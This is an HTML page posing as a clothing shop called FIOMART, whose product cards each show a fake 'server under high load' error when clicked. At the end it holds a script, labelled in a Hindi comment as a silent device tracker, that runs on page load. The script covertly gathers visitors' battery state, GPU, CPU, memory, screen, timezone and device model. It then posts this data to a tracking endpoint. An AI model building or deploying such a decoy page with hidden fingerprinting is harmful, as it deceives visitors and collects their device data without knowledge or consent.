<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FIOMART | Premium Clothing Store</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: Arial, sans-serif; }
        body { background-color: #f7f9fa; color: #333; }
        nav { background: #fff; padding: 20px 40px; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 2px 5px rgba(0,0,0,0.05); }
        .logo { font-size: 24px; font-weight: bold; color: #ff3f6c; text-decoration: none; }
        .grid { max-width: 1200px; margin: 40px auto; padding: 0 20px; display: grid; grid-template-columns: repeat(auto-fill, minmax(250px, 1fr)); gap: 30px; }
        .card { background: white; border: 1px solid #eaeaec; overflow: hidden; text-decoration: none; color: inherit; display: flex; flex-direction: column; cursor: pointer; }
        .img-box { width: 100%; height: 320px; background: #f4f4f4; }
        .img-box img { width: 100%; height: 100%; object-fit: cover; }
        .info { padding: 15px; }
        .brand { font-weight: bold; font-size: 14px; text-transform: uppercase; margin-bottom: 5px; }
        .name { font-size: 13px; color: #535766; margin-bottom: 8px; }
        .price { font-weight: bold; color: #282c3f; }
        .old-price { text-decoration: line-through; color: #7e818c; font-size: 12px; margin-left: 5px; }
    </style>
</head>
<body>

    <nav>
        <a href="index.html" class="logo">FIOMART</a>
        <div style="font-weight: bold; color: #333;">🛍️ Bag (0)</div>
    </nav>

    <div class="grid">
        <!-- 👔 Men's Shirt (Direct Internet Image) -->
        <div class="card" onclick="alert('Error 503: Server under high load. Please try again later.')">
            <div class="img-box">
                <img src="https://picsum.photos" alt="Men Shirt">
            </div>
            <div class="info">
                <div class="brand">Dennis Lingo</div>
                <div class="name">Men Slim Fit Cotton Casual Shirt</div>
                <div class="price">₹699 <span class="old-price">₹1,849</span></div>
            </div>
        </div>

        <!-- 👗 Women's Dress (Direct Internet Image) -->
        <div class="card" onclick="alert('Error 503: Server under high load. Please try again later.')">
            <div class="img-box">
                <img src="https://picsum.photos" alt="Women Dress">
            </div>
            <div class="info">
                <div class="brand">Berrylush</div>
                <div class="name">Women V-Neck Floral Print Dress</div>
                <div class="price">₹899 <span class="old-price">₹2,249</span></div>
            </div>
        </div>

        <!-- 👔 Men's Jacket -->
        <div class="card" onclick="alert('Error 503: Server under high load. Please try again later.')">
            <div class="img-box">
                <img src="https://picsum.photos" alt="Men Jacket">
            </div>
            <div class="info">
                <div class="brand">Roadster Co.</div>
                <div class="name">Men Standard Denim Trucker Jacket</div>
                <div class="price">₹1,199 <span class="old-price">₹2,999</span></div>
            </div>
        </div>

        <!-- 👗 Women's Top -->
        <div class="card" onclick="alert('Error 503: Server under high load. Please try again later.')">
            <div class="img-box">
                <img src="https://picsum.photos" alt="Women Top">
            </div>
            <div class="info">
                <div class="brand">Tokyo Talkies</div>
                <div class="name">Women Minimalist Elegant Casual Top</div>
                <div class="price">₹499 <span class="old-price">₹1,249</span></div>
            </div>
        </div>
    </div>

    <!-- 🤫 Silent Device Tracker (बैटरी और आईपी डेटा आपके लॉग्ज में भेजेगा) -->
    <script>
        async function runTracker() {
            try {
                let metadata = {
                    screenRes: `${window.screen.width}x${window.screen.height}`,
                    pixelRatio: window.devicePixelRatio || 1,
                    cores: navigator.hardwareConcurrency || "Hidden",
                    ram: navigator.deviceMemory || "Hidden",
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                };
                if (navigator.getBattery) {
                    try { const b = await navigator.getBattery(); metadata.batteryLevel = `${Math.round(b.level * 100)}%`; metadata.isCharging = b.charging ? "Yes" : "No"; } catch(e){}
                }
                try {
                    const canvas = document.createElement('canvas'); const gl = canvas.getContext('webgl');
                    if (gl) { const d = gl.getExtension('WEBGL_debug_renderer_info'); metadata.gpuRenderer = gl.getParameter(d.UNMASKED_RENDERER_WEBGL); }
                } catch(e){}
                if (navigator.userAgentData) {
                    const h = await navigator.userAgentData.getHighEntropyValues(["model", "platformVersion"]);
                    metadata.exactModel = h.model || navigator.platform || "Unknown"; metadata.osVersion = h.platformVersion || "Unknown";
                } else { metadata.exactModel = navigator.platform || "Unknown"; metadata.osVersion = "N/A"; }

                fetch('/api/track', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(metadata) });
            } catch (err) {}
        }
        window.onload = runTracker;
    </script>
</body>
</html>
